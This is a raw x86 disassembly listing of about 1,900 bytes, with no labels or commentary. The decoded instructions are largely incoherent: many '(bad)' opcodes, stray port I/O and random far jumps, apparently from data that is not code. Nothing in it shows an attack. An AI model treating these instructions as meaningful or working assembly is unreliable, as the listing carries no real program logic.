  423c30:	push   esp
  423c31:	rcr    eax,0x12
  423c34:	lock xor ecx,DWORD PTR [esi]
  423c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c38:	sbb    bl,cl
  423c3a:	pop    ss
  423c3b:	ds inc eax
  423c3d:	xor    eax,0x20d00000
  423c42:	stos   DWORD PTR es:[edi],eax
  423c43:	jbe    0x423c3b
  423c45:	inc    ecx
  423c46:	and    al,bh
  423c48:	inc    esi
  423c49:	dec    edi
  423c4a:	icebp  
  423c4b:	sbb    bl,BYTE PTR [esi+0x4f]
  423c4e:	sub    edi,DWORD PTR [eax-0x4958eb8e]
  423c54:	mov    ds:0x45ce36ba,al
  423c59:	popa   
  423c5a:	(bad)  
  423c5b:	cmp    edi,ebp
  423c5d:	(bad)  
  423c5e:	push   ebp
  423c5f:	les    esi,FWORD PTR [eax+0x0]
  423c62:	add    BYTE PTR [esi+0x6a],bl
  423c65:	jnp    0x423c49
  423c67:	loopne 0x423c8b
  423c69:	push   esi
  423c6a:	in     al,0x10
  423c6c:	arpl   si,sp
  423c6e:	test   ah,bl
  423c70:	add    BYTE PTR [eax],al
  423c72:	sub    ch,BYTE PTR [esi+0x5a40fa76]
  423c78:	add    BYTE PTR [eax],al
  423c7a:	es and eax,0x5da0e87b
  423c80:	enter  0x6d,0x0
  423c84:	mov    edi,0x8e0087fb
  423c89:	add    BYTE PTR [eax],al
  423c8b:	add    ah,0x0
  423c8e:	add    BYTE PTR [esi+esi*2-0x3],ah
  423c92:	and    eax,0xfdc88e
  423c97:	add    BYTE PTR [eax+0x518d3a5d],dl
  423c9d:	inc    ecx
  423c9e:	rcl    dl,cl
  423ca0:	stos   BYTE PTR es:[edi],al
  423ca1:	push   0xffffff80
  423ca3:	dec    ebp
  423ca4:	add    BYTE PTR [eax],al
  423ca6:	add    DWORD PTR [ebx-0x2d395718],esi
  423cac:	inc    edi
  423cad:	inc    esi
  423cae:	cmp    ebp,eax
  423cb0:	and    DWORD PTR [ecx],0x16
  423cb3:	(bad)  
  423cb4:	xor    ebx,DWORD PTR [ebx+eax*1+0x48]
  423cb8:	into   
  423cb9:	add    BYTE PTR [eax],al
  423cbb:	cli    
  423cbc:	imul   esi,edx,0x7866130e
  423cc2:	(bad)  
  423cc3:	mul    cl
  423cc5:	nop
  423cc6:	shr    ch,0x0
  423cc9:	add    BYTE PTR [edi+0x55],ah
  423ccc:	loop   0x423cea
  423cce:	(bad)  
  423ccf:	in     eax,dx
  423cd0:	add    esp,edx
  423cd2:	sub    ebp,DWORD PTR [ebx-0x348cd49d]
  423cd8:	mov    DWORD PTR es:[edx],eax
  423cdb:	mov    edx,0xea036e6b
  423ce0:	test   eax,0xb8d52a79
  423ce5:	ret    
  423ce6:	call   0x5356:0x6208
  423ced:	push   ss
  423cee:	std    
  423cef:	jle    0x423c89
  423cf1:	(bad)  
  423cf2:	jo     0x423d73
  423cf4:	or     DWORD PTR ds:0xa8ddf024,0xffffffee
  423cfb:	clc    
  423cfc:	fistp  DWORD PTR [ebx+0x5c]
  423cff:	add    cl,dl
  423d01:	add    BYTE PTR [eax],al
  423d03:	push   ecx
  423d04:	outs   dx,BYTE PTR ds:[esi]
  423d05:	pop    eax
  423d06:	pop    edi
  423d07:	test   al,0x4b
  423d09:	mov    bl,BYTE PTR [ebp+ecx*2+0x22]
  423d0d:	mov    sp,0x9742
  423d11:	(bad)  
  423d12:	mov    esi,0xc566b57f
  423d17:	in     al,dx
  423d18:	mov    cl,0x33
  423d1a:	pop    ss
  423d1b:	outs   dx,BYTE PTR ds:[esi]
  423d1c:	xchg   esi,eax
  423d1d:	lds    ecx,FWORD PTR [ecx+0x43636e25]
  423d23:	cmp    esi,DWORD PTR [ecx+0x5dec01e3]
  423d29:	xor    BYTE PTR cs:[edi-0x2e],ah
  423d2d:	mov    al,0xe6
  423d2f:	int    0x1a
  423d31:	add    cl,bl
  423d33:	add    BYTE PTR [eax],al
  423d35:	les    edi,FWORD PTR [edx+0x42ad0000]
  423d3b:	int3   
  423d3c:	mov    eax,0xc86f0000
  423d41:	fld    QWORD PTR [eax]
  423d43:	add    BYTE PTR [edi],cl
  423d45:	popf   
  423d46:	mov    cl,0x73
  423d48:	out    0x47,eax
  423d4a:	pop    ebx
  423d4b:	pusha  
  423d4c:	jb     0x423cde
  423d4e:	out    dx,al
  423d4f:	pop    es
  423d50:	cdq    
  423d51:	ins    BYTE PTR es:[edi],dx
  423d52:	sbb    eax,0xba5e3476
  423d57:	stc    
  423d58:	jmp    0x423d7e
  423d5a:	dec    esi
  423d5b:	inc    eax
  423d5c:	mov    al,BYTE PTR [eax]
  423d5e:	add    BYTE PTR [edi-0x3a],dl
  423d61:	pop    ecx
  423d62:	in     eax,0x3d
  423d64:	into   
  423d65:	cmp    al,0x78
  423d67:	ss (bad) 
  423d69:	popa   
  423d6a:	mov    al,0x46
  423d6c:	std    
  423d6d:	push   ebp
  423d6e:	mov    esp,0x4e2ba8
  423d73:	jne    0x423d75
  423d75:	add    BYTE PTR [ecx+0x72fb0776],dh
  423d7b:	fs cmc 
  423d7d:	mov    esi,ebp
  423d7f:	xor    eax,0x34029e3d
  423d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d85:	repz jbe 0x423d13
  423d88:	(bad)  [ecx]
  423d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d8b:	enter  0x92,0x0
  423d8f:	push   edi
  423d90:	lock inc ebp
  423d92:	enter  0x8e,0x0
  423d96:	icebp  
  423d97:	jae    0x423d3e
  423d99:	fcomp  st(6)
  423d9b:	aas    
  423d9c:	outs   dx,BYTE PTR ds:[esi]
  423d9d:	add    al,0xe7
  423d9f:	add    BYTE PTR [eax],al
  423da1:	enter  0xc0,0x0
  423da5:	fdiv   QWORD PTR [esi+0x5255e3a7]
  423dab:	lds    ecx,FWORD PTR [ebp+0x24]
  423dae:	xor    BYTE PTR [ebp-0x6f],ch
  423db1:	xor    DWORD PTR [ebp+0x50],esp
  423db4:	add    DWORD PTR [edi],esi
  423db6:	inc    edi
  423db7:	or     ebx,0xdeba248f
  423dbd:	icebp  
  423dbe:	cmp    eax,DWORD PTR [ebx+0x67b566b9]
  423dc4:	xchg   ebp,eax
  423dc5:	aas    
  423dc6:	(bad)  
  423dc7:	cmp    edx,DWORD PTR [esi]
  423dc9:	loopne 0x423e1d
  423dcb:	js     0x423d99
  423dcd:	mov    DWORD PTR [eax],eax
  423dcf:	add    BYTE PTR [esi],bl
  423dd1:	loope  0x423e04
  423dd3:	pop    eax
  423dd4:	mov    ah,0xbd
  423dd6:	push   0xffffffed
  423dd8:	lods   al,BYTE PTR ds:[esi]
  423dd9:	or     edi,DWORD PTR [eax-0x30]
  423ddc:	xor    BYTE PTR [ecx],0xbf
  423ddf:	jecxz  0x423e1b
  423de1:	mov    ebx,0x13d271c3
  423de6:	(bad)
  423de9:	dec    esi
  423dea:	and    DWORD PTR [edx],0xffffffae
  423ded:	mov    ecx,0x89ad680b
  423df2:	sbb    al,0x8f
  423df4:	cwde   
  423df5:	add    dh,al
  423df7:	add    BYTE PTR [eax],al
  423df9:	call   0x6d4d325f
  423dfe:	xchg   ebx,eax
  423dff:	idiv   BYTE PTR [edx]
  423e01:	mov    edi,ebp
  423e03:	jle    0x423df1
  423e05:	rcl    cl,cl
  423e07:	inc    esi
  423e08:	fidiv  WORD PTR [esi+0x39]
  423e0b:	sar    DWORD PTR [esi],1
  423e0d:	mov    ecx,0xf71adcfd
  423e12:	xchg   ecx,eax
  423e13:	addr16 mov bl,0x15
  423e16:	arpl   dx,bp
  423e18:	and    DWORD PTR [edi-0x66],esp
  423e1b:	cdq    
  423e1c:	push   cs
  423e1d:	in     eax,0xe6
  423e1f:	or     eax,0x9ceadd7c
  423e24:	mov    cl,0x9f
  423e26:	xchg   ecx,eax
  423e27:	enter  0x5f,0x0
  423e2b:	and    ebx,ebp
  423e2d:	mov    cl,0x98
  423e2f:	(bad)  
  423e30:	ds push edx
  423e32:	mov    edi,0xbbafb8eb
  423e37:	inc    ebp
  423e38:	pop    es
  423e39:	sbb    al,0x8c
  423e3b:	cmp    eax,0x9be00000
  423e40:	loope  0x423dd7
  423e42:	adc    esi,ecx
  423e44:	int3   
  423e45:	adc    al,BYTE PTR [eax]
  423e47:	add    bl,cl
  423e49:	cwde   
  423e4a:	rcl    BYTE PTR [ebx+0x56],cl
  423e4d:	ret    
  423e4e:	xchg   ebp,eax
  423e4f:	je     0x423e54
  423e51:	mov    eax,0x2fd3dd86
  423e56:	aad    0x29
  423e58:	out    dx,eax
  423e59:	push   ebx
  423e5a:	ret    
  423e5b:	(bad)  
  423e5c:	clc    
  423e5d:	ss test cl,dh
  423e60:	add    BYTE PTR [eax],al
  423e62:	ins    DWORD PTR es:[edi],dx
  423e63:	pop    edi
  423e64:	repnz xchg edx,eax
  423e66:	mov    ch,0xca
  423e68:	sti    
  423e69:	add    DWORD PTR [ebx],ecx
  423e6b:	push   ebp
  423e6c:	sti    
  423e6d:	outs   dx,BYTE PTR gs:[esi]
  423e6f:	jo     0x423e1f
  423e71:	and    ecx,DWORD PTR [eax*2+0x69fd0000]
  423e78:	adc    BYTE PTR [eax+0x7b],al
  423e7b:	add    BYTE PTR [eax],al
  423e7d:	icebp  
  423e7e:	mov    BYTE PTR [eax+eax*1-0x170bf900],bl
  423e85:	pusha  
  423e86:	jns    0x423e2c
  423e88:	(bad)  
  423e89:	cdq    
  423e8a:	mov    bl,0x4c
  423e8c:	sbb    eax,0x181f0000
  423e91:	outs   dx,BYTE PTR ds:[esi]
  423e92:	les    ecx,FWORD PTR [eax+eax*1-0x31e60400]
  423e99:	jg     0x423ec4
  423e9b:	arpl   WORD PTR [eax+0x2348],sp
  423ea1:	inc    edx
  423ea2:	fwait
  423ea3:	jb     0x423ebf
  423ea5:	xor    al,0x45
  423ea7:	or     BYTE PTR [ecx-0x58],0xfc
  423eab:	leave  
  423eac:	retf   
  423ead:	dec    esp
  423eae:	out    dx,al
  423eaf:	add    BYTE PTR [eax],al
  423eb1:	jl     0x423f28
  423eb3:	jg     0x423ec3
  423eb5:	mov    ah,0xf0
  423eb7:	sti    
  423eb8:	xor    esp,ecx
  423eba:	cmp    DWORD PTR [eax],eax
  423ebc:	add    BYTE PTR [ebp+0x19],dl
  423ebf:	ret    0x606
  423ec2:	ds in  al,0x6d
  423ec5:	sbb    eax,0x7f05b9dd
  423eca:	shl    BYTE PTR [ebp+0x4a],cl
  423ecd:	aad    0x82
  423ecf:	inc    esp
  423ed0:	les    eax,FWORD PTR [eax]
  423ed2:	add    BYTE PTR [esi+0x3c],bh
  423ed5:	mov    WORD PTR [eax+eax*1+0x0],fs
  423ed9:	dec    BYTE PTR [esi+0x77]
  423edc:	and    DWORD PTR [ebx-0x1aea407a],ebx
  423ee2:	jl     0x423eed
  423ee4:	ret    0x31ae
  423ee7:	and    eax,0x1b955b30
  423eec:	fmul   st(1),st
  423eee:	stc    
  423eef:	popf   
  423ef0:	js     0x423ea2
  423ef2:	adc    BYTE PTR [ebx],al
  423ef4:	pop    ebp
  423ef5:	push   eax
  423ef6:	xchg   BYTE PTR [edx],dh
  423ef8:	pop    esi
  423ef9:	sbb    DWORD PTR [edi+0x6f],esp
  423efc:	xor    ecx,edx
  423efe:	mov    dl,0x67
  423f00:	lods   eax,DWORD PTR ds:[esi]
  423f01:	mov    dl,0x1c
  423f03:	or     DWORD PTR [edi-0x7f1401da],esi
  423f09:	mov    esi,0x44050000
  423f0e:	stos   DWORD PTR es:[edi],eax
  423f0f:	add    BYTE PTR [eax],al
  423f11:	pusha  
  423f12:	sahf   
  423f13:	pop    ebp
  423f14:	jmp    0x1583901
  423f19:	enter  0x54,0x0
  423f1d:	sbb    DWORD PTR [esi],0x3e3d63c9
  423f23:	out    dx,al
  423f24:	pop    ecx
  423f25:	out    dx,eax
  423f26:	ins    BYTE PTR es:[edi],dx
  423f27:	mov    eax,ds:0x72ebd7c9
  423f2c:	addr16 jns 0x423f64
  423f2f:	push   eax
  423f30:	stos   DWORD PTR es:[edi],eax
  423f31:	jbe    0x423f79
  423f33:	je     0x423f47
  423f35:	mov    bh,0x3
  423f37:	retf   0xfd93
  423f3a:	xchg   edi,eax
  423f3b:	dec    esp
  423f3c:	fwait
  423f3d:	add    BYTE PTR [eax],al
  423f3f:	sub    al,0x88
  423f41:	xchg   esp,eax
  423f42:	add    BYTE PTR [eax],al
  423f44:	aad    0xf
  423f46:	mov    WORD PTR [eax],ds
  423f48:	add    BYTE PTR [eax],al
  423f4a:	das    
  423f4b:	pop    edi
  423f4c:	mov    esp,0x582b71a9
  423f51:	push   edx
  423f52:	loopne 0x423fcf
  423f54:	nop
  423f55:	xchg   edi,eax
  423f56:	lahf   
  423f57:	ss jle 0x423f4c
  423f5a:	push   ss
  423f5b:	jnp    0x423f15
  423f5d:	mov    edx,0xe66dcfed
  423f62:	mov    al,0xe7
  423f64:	sbb    al,0x82
  423f66:	pop    es
  423f67:	aaa    
  423f68:	ds or  edx,ebp
  423f6b:	sub    ecx,0xecbf5ee2
  423f71:	mov    esi,0xf9402b
  423f76:	add    BYTE PTR [edx],ah
  423f78:	mov    ecx,0xeafea2da
  423f7d:	gs mov cl,0x4e
  423f80:	nop
  423f81:	fwait
  423f82:	dec    edi
  423f83:	scas   al,BYTE PTR es:[edi]
  423f84:	mov    ecx,0x11f97e1c
  423f89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f8a:	leave  
  423f8b:	ret    
  423f8c:	sbb    ax,0x7f13
  423f90:	sti    
  423f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f92:	mov    al,0xef
  423f94:	add    ch,BYTE PTR [eax-0x4ea0810e]
  423f9a:	cmc    
  423f9b:	jl     0x423fb6
  423f9d:	push   ecx
  423f9e:	push   ebp
  423f9f:	retf   0x1673
  423fa2:	in     eax,0xf1
  423fa4:	mov    dl,BYTE PTR [ecx]
  423fa6:	mov    bh,0x9d
  423fa8:	outs   dx,DWORD PTR ds:[esi]
  423fa9:	cmovno eax,DWORD PTR [esi+eax*2+0x0]
  423fae:	add    ch,ch
  423fb0:	xlat   BYTE PTR ds:[ebx]
  423fb1:	cmc    
  423fb2:	out    0xab,eax
  423fb4:	jbe    0x423f3e
  423fb6:	loope  0x423fb8
  423fb8:	add    dl,bh
  423fba:	nop
  423fbb:	test   BYTE PTR es:[esi-0x6],0xa4
  423fc0:	fidivr WORD PTR [ebx+eax*8-0x20]
  423fc4:	(bad)  
  423fc5:	popa   
  423fc6:	ret    
  423fc7:	jo     0x423fd4
  423fc9:	neg    DWORD PTR [ebp-0x42]
  423fcc:	arpl   bp,ax
  423fce:	mov    ds:0xdf01ce0,eax
  423fd3:	jg     0x423fce
  423fd5:	mov    eax,ds:0x5d6aa403
  423fda:	xchg   ecx,eax
  423fdb:	retf   
  423fdc:	sub    esi,ebp
  423fde:	xlat   BYTE PTR ds:[ebx]
  423fdf:	(bad)  
  423fe0:	or     eax,0xd018934d
  423fe5:	pushf  
  423fe6:	test   BYTE PTR [edi+0x0],ch
  423fe9:	add    BYTE PTR [ebp+0x71],bh
  423fec:	sub    eax,0xc8e69ed1
  423ff1:	jg     0x423ff3
  423ff3:	add    BYTE PTR [ebx+0x1c],ah
  423ff6:	sbb    eax,0x1587503b
  423ffb:	add    edx,DWORD PTR ds:0x57b883fe
  424001:	test   DWORD PTR ds:0x2b84,ecx
  424007:	lsl    edx,WORD PTR [ebp-0x324c4760]
  42400e:	ja     0x42400b
  424010:	xchg   ebp,eax
  424011:	push   esp
  424012:	shr    DWORD PTR [ebx+edx*4+0x7e68a939],cl
  424019:	lock xor al,dl
  42401c:	pop    edi
  42401d:	cmc    
  42401e:	test   DWORD PTR ds:0x12c62bd0,ebx
  424024:	(bad)  
  424025:	cmp    edx,DWORD PTR [esi-0x4c957464]
  42402b:	addr16 push ds
  42402d:	scas   al,BYTE PTR es:[edi]
  42402e:	jecxz  0x42405e
  424030:	mov    edi,0x9ed30a6a
  424035:	jle    0x4240b3
  424037:	push   0xfffffffb
  424039:	jns    0x42408b
  42403b:	ret    0x4ed2
  42403e:	add    eax,0x5b08b0
  424043:	add    al,al
  424045:	aaa    
  424046:	add    BYTE PTR [eax],al
  424048:	mov    al,0x77
  42404a:	adc    al,0xb
  42404c:	and    ah,BYTE PTR [ecx+0xbd8c]
  424052:	imul   ebx,DWORD PTR [ebx+0x2b],0x1b
  424056:	xchg   ebp,eax
  424057:	pop    ebp
  424058:	nop
  424059:	and    esi,DWORD PTR [ebx-0xc]
  42405c:	sbb    DWORD PTR [edx+0xc308],0x7
  424063:	jne    0x424023
  424065:	icebp  
  424066:	fsub   QWORD PTR [eax]
  424068:	cmp    eax,edi
  42406a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42406b:	clc    
  42406c:	ins    BYTE PTR es:[edi],dx
  42406d:	(bad)  
  42406e:	sbb    al,BYTE PTR [ebp+0x9a8c17]
  424074:	add    BYTE PTR [ebx],bl
  424076:	pop    es
  424077:	out    dx,eax
  424078:	inc    ecx
  424079:	nop
  42407a:	pop    edx
  42407b:	push   cs
  42407c:	sub    eax,0x2eeb63a6
  424081:	jnp    0x42402a
  424083:	cmp    edi,DWORD PTR [edx+0x21]
  424086:	push   cs
  424087:	jmp    0x1acb02c4
  42408c:	add    BYTE PTR [eax],al
  42408e:	aaa    
  42408f:	or     ecx,esi
  424091:	jbe    0x4240ef
  424093:	shl    DWORD PTR [eax],0x30
  424096:	xchg   BYTE PTR [edx],bh
  424098:	mov    edi,0xcf03e77b
  42409d:	mov    ds:0xd64ced33,al
  4240a2:	add    BYTE PTR [eax],al
  4240a4:	adc    eax,0xffe7f2f0
  4240a9:	xchg   ecx,eax
  4240aa:	lds    esi,FWORD PTR [ebp-0xcf6e52]
  4240b0:	jp     0x424078
  4240b2:	adc    eax,0xec44
  4240b7:	icebp  
  4240b8:	pop    esi
  4240b9:	cdq    
  4240ba:	pop    esi
  4240bb:	gs into 
  4240bd:	or     al,BYTE PTR [ecx]
  4240bf:	sub    BYTE PTR [ecx],bh
  4240c1:	xor    DWORD PTR [ecx-0x2223fe87],esp
  4240c7:	sahf   
  4240c8:	push   cs
  4240c9:	cld    
  4240ca:	jns    0x424059
  4240cc:	test   al,bh
  4240ce:	add    BYTE PTR [eax],al
  4240d0:	mov    eax,0xac688216
  4240d5:	into   
  4240d6:	xor    edx,DWORD PTR [ebp-0x3fa9e289]
  4240dc:	mov    cl,0x0
  4240de:	add    BYTE PTR [edx+0xf12d1ab],ch
  4240e4:	fdivp  st(6),st
  4240e6:	jg     0x424085
  4240e8:	in     al,dx
  4240e9:	xor    eax,0xad88fc
  4240ee:	add    BYTE PTR [edi+ecx*8],cl
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	int    0x55
  4240f5:	push   0xffffffa9
  4240f7:	or     eax,0x64ff1d4d
  4240fc:	cli    
  4240fd:	(bad)  
  4240fe:	mov    edx,eax
  424100:	mov    bh,0xc7
  424102:	scas   eax,DWORD PTR es:[edi]
  424103:	lods   eax,DWORD PTR ds:[esi]
  424104:	sub    ebp,DWORD PTR [ecx]
  424106:	xchg   ebx,eax
  424107:	mov    edx,0x855686f7
  42410c:	sub    al,0x70
  42410e:	dec    edx
  42410f:	cmp    ebx,DWORD PTR [ebx-0x441d05a0]
  424115:	add    DWORD PTR [ebx],0xffffffe2
  424118:	repnz mov bh,0x65
  42411b:	jns    0x4240cd
  42411d:	mov    bl,0x4e
  42411f:	lahf   
  424120:	inc    eax
  424121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424122:	add    BYTE PTR [eax],al
  424124:	repz clc 
  424126:	addr16 js 0x4240ee
  424129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42412a:	and    ecx,ebx
  42412c:	push   0x90c4b087
  424131:	add    BYTE PTR [eax],al
  424133:	rcr    DWORD PTR [ebx],1
  424135:	sub    esp,edx
  424137:	mov    DWORD PTR [edi],ecx
  424139:	in     al,dx
  42413a:	cmp    ecx,DWORD PTR [ecx]
  42413c:	lea    ecx,[ecx+ebp*4+0x43b30000]
  424143:	ja     0x42413a
  424145:	enter  0xe,0x0
  424149:	lea    edx,[edx+0x74943cfd]
  42414f:	fmul   DWORD PTR [eax+0x8]
  424152:	add    BYTE PTR [eax],al
  424154:	dec    esp
  424155:	xchg   esp,eax
  424156:	add    BYTE PTR [eax],al
  424158:	add    DWORD PTR [eax+0x7eea4f11],edx
  42415e:	(bad)  
  42415f:	arpl   ax,bp
  424161:	xor    bl,BYTE PTR [esi+0x12]
  424164:	(bad)  
  424165:	xchg   edi,eax
  424166:	jp     0x424154
  424168:	mov    eax,ds:0xaac0
  42416d:	pushf  
  42416e:	jg     0x42416e
  424170:	pop    ss
  424171:	dec    edi
  424172:	loopne 0x4241a9
  424174:	jecxz  0x424112
  424176:	cwde   
  424177:	test   eax,0xeaa390b5
  42417c:	cs lock sti 
  42417f:	mov    ebp,0x566a2d1c
  424184:	les    esi,FWORD PTR [ecx]
  424186:	add    BYTE PTR [eax],al
  424188:	idiv   DWORD PTR ds:0x5dc4245e
  42418e:	add    BYTE PTR [eax],al
  424190:	inc    ebp
  424191:	mov    gs,WORD PTR [ebp-0x683cea5f]
  424197:	pop    edi
  424198:	jl     0x424204
  42419a:	mov    esp,0x170386be
  42419f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241a0:	pop    ecx
  4241a1:	dec    esi
  4241a2:	call   0x6c:0x80a8417c
  4241a9:	add    BYTE PTR [edi+ebp*4+0x4f],ah
  4241ad:	mov    cl,0xe1
  4241af:	cs sbb eax,esp
  4241b2:	in     al,0x23
  4241b4:	xchg   ebx,eax
  4241b5:	loop   0x424209
  4241b7:	fcomi  st,st(0)
  4241b9:	mov    ebp,0xa227dd14
  4241be:	cmc    
  4241bf:	test   DWORD PTR [edx+0x77db4728],ebx
  4241c5:	fdivrp st(4),st
  4241c7:	adc    eax,0x441ac2ec
  4241cc:	dec    edx
  4241cd:	add    BYTE PTR [eax],al
  4241cf:	push   ss
  4241d0:	xlat   BYTE PTR ds:[ebx]
  4241d1:	mov    DWORD PTR [esi+0x520454f7],ebx
  4241d7:	add    BYTE PTR [eax],al
  4241d9:	lahf   
  4241da:	jno    0x42418b
  4241dc:	pop    ebp
  4241dd:	or     BYTE PTR [eax+eax*1+0x65444b00],cl
  4241e4:	add    BYTE PTR [eax],al
  4241e6:	loop   0x424172
  4241e8:	inc    ecx
  4241e9:	jg     0x42424a
  4241eb:	mov    ch,0x5
  4241ed:	mov    edx,0x73e51b5e
  4241f2:	pop    ds
  4241f3:	lea    eax,[edx+0x624f364d]
  4241f9:	je     0x424233
  4241fb:	adc    eax,0x2739cf55
  424200:	outs   dx,DWORD PTR ds:[esi]
  424201:	popa   
  424202:	shr    DWORD PTR [edi],cl
  424204:	or     DWORD PTR [edi],0xffffff89
  424207:	js     0x42419b
  424209:	and    bl,BYTE PTR [ecx-0x71]
  42420c:	or     esp,0x46000058
  424212:	add    BYTE PTR [edi],al
  424214:	add    BYTE PTR [eax],al
  424216:	sahf   
  424217:	sahf   
  424218:	sahf   
  424219:	test   BYTE PTR [esi+0x0],al
  42421c:	add    ah,dh
  42421e:	jg     0x42422f
  424220:	dec    ebx
  424221:	jmp    0x7a:0x2f49b0
  424228:	add    al,bl
  42422a:	mov    ds:0x1fc2d81,al
  42422f:	ret    
  424230:	popf   
  424231:	jno    0x42425f
  424233:	dec    esp
  424234:	xchg   ecx,eax
  424235:	add    BYTE PTR [eax],al
  424237:	add    al,0x90
  424239:	add    BYTE PTR [eax],al
  42423b:	cld    
  42423c:	xchg   esi,eax
  42423d:	dec    ebx
  42423e:	icebp  
  42423f:	jae    0x424292
  424241:	ja     0x4241e3
  424243:	nop
  424244:	inc    esi
  424245:	into   
  424246:	ja     0x42428c
  424248:	data16 add BYTE PTR [eax],al
  42424b:	and    ecx,ebp
  42424d:	mov    eax,DWORD PTR [ecx-0x11dfdac6]
  424253:	push   ss
  424254:	lds    esi,FWORD PTR [ecx]
  424256:	cwde   
  424257:	mov    edi,0xa1340225
  42425c:	sahf   
  42425d:	idiv   DWORD PTR [edx]
  42425f:	dec    esp
  424261:	fwait
  424262:	add    BYTE PTR [eax],al
  424264:	mov    edi,0x2f0aa745
  424269:	pop    ds
  42426a:	aam    0x9e
  42426c:	aam    0x6e
  42426e:	cmp    al,0x92
  424270:	fcomp  DWORD PTR [ecx-0x2a]
  424273:	mov    al,ds:0x4be3f828
  424278:	fmul   DWORD PTR [ebx]
  42427a:	aad    0x99
  42427c:	and    eax,0x7a7d308a
  424281:	adc    al,0x61
  424283:	xchg   ebx,eax
  424284:	cmp    BYTE PTR [ebp+0x55],bl
  424287:	jmp    0x42427c
  424289:	gs jae 0x42427a
  42428c:	ins    BYTE PTR es:[edi],dx
  42428d:	(bad)  
  42428f:	sbb    bh,BYTE PTR ds:0xce3ee1cb
  424295:	push   edi
  424296:	push   cs
  424297:	stc    
  424298:	inc    esi
  424299:	adc    al,0xd8
  42429b:	mov    dh,BYTE PTR [esi]
  42429d:	pop    edi
  42429e:	dec    ebp
  42429f:	jbe    0x4242d2
  4242a1:	push   0x59
  4242a3:	in     al,dx
  4242a4:	daa    
  4242a5:	mov    dl,BYTE PTR [ecx-0x24]
  4242a8:	aas    
  4242a9:	scas   al,BYTE PTR es:[edi]
  4242aa:	inc    edi
  4242ab:	adc    ebx,DWORD PTR [esi+0x6d]
  4242ae:	les    esp,FWORD PTR [eax+0x5a2d0000]
  4242b4:	or     esp,DWORD PTR [eax+0x4]
  4242b7:	inc    ecx
  4242b8:	add    BYTE PTR [eax],al
  4242ba:	stos   BYTE PTR es:[edi],al
  4242bb:	rol    BYTE PTR [ebp+0x3c040000],0x0
  4242c2:	add    BYTE PTR [edx],ah
  4242c4:	(bad)  
  4242c5:	shr    DWORD PTR [edi],0xe3
  4242c8:	icebp  
  4242c9:	(bad)  
  4242ca:	push   ecx
  4242cb:	sbb    DWORD PTR ds:0xc2c2a5ad,edx
  4242d1:	ret    0xe74f
  4242d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242d5:	sti    
  4242d6:	std    
  4242d7:	clc    
  4242d8:	scas   al,BYTE PTR es:[edi]
  4242d9:	jmp    0xfceb:0x5800
  4242e0:	push   eax
  4242e1:	dec    edx
  4242e2:	dec    esp
  4242e3:	xor    DWORD PTR [eax],eax
  4242e5:	add    BYTE PTR ds:0xdec4,dl
  4242eb:	inc    esi
  4242ec:	ins    DWORD PTR es:[edi],dx
  4242ed:	loop   0x4242f8
  4242ef:	fidivr DWORD PTR [esi+0x4ce99e8]
  4242f5:	and    DWORD PTR [eax],eax
  4242f7:	add    BYTE PTR [ebx-0x2464ce88],dh
  4242fd:	ret    
  4242fe:	ins    DWORD PTR es:[edi],dx
  4242ff:	xchg   edi,eax
  424300:	scas   al,BYTE PTR es:[edi]
  424301:	jmp    0x6b03:0xdd927418
  424308:	push   ebx
  424309:	jecxz  0x42436e
  42430b:	fprem1 
  42430d:	rcl    BYTE PTR [esi],1
  42430f:	jg     0x424291
  424311:	xor    BYTE PTR [eax],al
  424313:	add    BYTE PTR [ebx+0x4a11aea],cl
  424319:	and    eax,DWORD PTR [eax]
  42431b:	add    bl,ah
  42431d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42431e:	addr16 cmc 
  424320:	dec    ebp
  424321:	cwde   
  424322:	into   
  424323:	addr16 test al,0x77
  424326:	add    DWORD PTR [ebx-0x67],ecx
  424329:	fs dec ebp
  42432b:	(bad)  
  42432d:	jo     0x4242d7
  42432f:	mov    cl,0x79
  424331:	or     DWORD PTR [ecx-0x39a17e33],ecx
  424337:	lahf   
  424338:	nop
  424339:	fstp   QWORD PTR [eax-0x13]
  42433c:	xchg   esp,eax
  42433d:	and    DWORD PTR [ecx+0x5fbf0d85],ebx
  424343:	and    al,0x15
  424345:	das    
  424346:	test   al,0x2c
  424348:	fisub  WORD PTR [esi-0xd868bba]
  42434e:	cmp    edx,DWORD PTR [esi-0x2c59a782]
  424354:	clc    
  424355:	mov    dl,0xd8
  424357:	and    eax,0x2df68a41
  42435c:	mov    al,0x2e
  42435e:	and    DWORD PTR [edi],eax
  424360:	(bad)  
  424361:	xchg   edx,eax
  424362:	in     al,0xa3
  424364:	xchg   esp,eax
  424365:	mov    al,BYTE PTR [eax]
  424367:	add    BYTE PTR fs:[eax],al
  42436a:	jne    0x4242f5
  42436c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42436d:	xchg   edi,eax
  42436e:	add    eax,0xf8145453
  424373:	inc    edx
  424374:	test   al,0xcf
  424376:	cdq    
  424377:	adc    ebp,DWORD PTR ds:0xdda237b
  42437d:	ret    
  42437e:	push   ds
  42437f:	sub    eax,0x68c4
  424384:	or     DWORD PTR [edx+0x19421c37],eax
  42438a:	imul   eax,DWORD PTR [esi+0x54ea5659],0x3e2d9cd2
  424394:	xlat   BYTE PTR ds:[ebx]
  424395:	dec    edi
  424396:	xor    ecx,DWORD PTR [eax-0x2]
  424399:	add    BYTE PTR [eax],al
  42439b:	push   esi
  42439c:	add    edx,DWORD PTR cs:[ebx]
  42439f:	call   DWORD PTR [edx-0x48]
  4243a2:	shl    edx,1
  4243a4:	add    al,0xb4
  4243a6:	add    BYTE PTR [eax],al
  4243a8:	mov    DWORD PTR [esi+eax*2+0x2c],ebp
  4243ac:	mov    WORD PTR [ecx],fs
  4243ae:	add    BYTE PTR [eax],al
  4243b0:	sbb    al,0xc7
  4243b2:	mov    bl,0xb1
  4243b4:	xchg   ebp,eax
